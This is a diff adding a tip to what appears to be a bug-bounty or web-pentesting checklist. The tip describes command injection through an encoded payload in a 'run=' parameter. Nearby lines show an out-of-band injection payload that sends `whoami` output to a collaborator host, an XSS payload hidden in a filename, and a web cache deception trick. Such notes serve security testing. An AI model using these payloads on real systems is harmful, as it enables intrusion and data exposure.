@@ -77,6 +77,10 @@ Logic and tokens
           If you got HTTP pingback on your server, also give this a try
           payload used   :  `whoami`.collaborator-url 
           got callback from  :  root.collaborator-url
+	  
+	  Found an endpoint with
+	  `something.php?run=`, execute the encoded `%26echo%20`id`%24()%5C%20 ` in HTTP request, 
+	  surprised to see when server returned ID. 
       
  38- if found file upload upload file, intercept it and change the name of file <svg/onload=alert``>.txt and send  
  39- try cache deception attack by going to page with senstive information and put file.css in url and try to access many times it should show the senstive page 
